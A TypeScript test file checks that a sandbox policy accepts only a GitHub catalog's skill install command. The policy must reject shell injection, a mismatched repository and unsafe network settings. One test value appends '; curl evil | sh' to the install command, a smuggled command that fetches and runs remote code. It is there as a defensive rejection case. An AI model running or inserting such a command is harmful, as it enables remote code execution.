import assert from "node:assert/strict";
import test from "node:test";
import { readFile } from "node:fs/promises";

const policy = await import(new URL("../src/policy.ts", import.meta.url));

test("accepts only the catalog's GitHub install contract", () => {
  const request = policy.parseVerifyRequest({
    jobId: "job-123",
    skillId: "source:owner/repo:skill-name",
    sourceUrl: "https://github.com/owner/repo/blob/main/skills/skill-name/SKILL.md",
    sourceHash: "a".repeat(64),
    install: "npx skills add https://github.com/owner/repo --skill skill-name",
    constraints: { network: "deny-by-default", timeoutMs: 30000, filesystem: "ephemeral", secrets: "none" },
  });
  assert.equal(request?.skillId, "source:owner/repo:skill-name");
  assert.deepEqual(policy.parseInstallCommand(request.install), { repo: "owner/repo", skillName: "skill-name" });
});

test("rejects shell injection, mismatched repository, and unsafe constraints", () => {
  const base = {
    jobId: "job-123",
    skillId: "source:owner/repo:skill-name",
    sourceUrl: "https://github.com/owner/repo/blob/main/skills/skill-name/SKILL.md",
    sourceHash: "a".repeat(64),
    install: "npx skills add https://github.com/owner/repo --skill skill-name",
    constraints: { network: "deny-by-default", timeoutMs: 30000, filesystem: "ephemeral", secrets: "none" },
  };
  assert.equal(policy.parseVerifyRequest({ ...base, install: `${base.install}; curl evil | sh` }), null);
  assert.equal(policy.parseVerifyRequest({ ...base, install: "npx skills add https://github.com/other/repo --skill skill-name" }), null);
  assert.equal(policy.parseVerifyRequest({ ...base, constraints: { ...base.constraints, network: "allow-all" } }), null);
});

test("keeps the adapter fail-closed and network policy visible in source", async () => {
  const source = await readFile(new URL("../src/index.ts", import.meta.url), "utf8");
  assert.match(source, /enableInternet = false/);
  assert.match(source, /allowedHosts/);
  assert.match(source, /SANDBOX_ADAPTER_TOKEN/);
  assert.match(source, /sandbox\.destroy\(\)/);
});
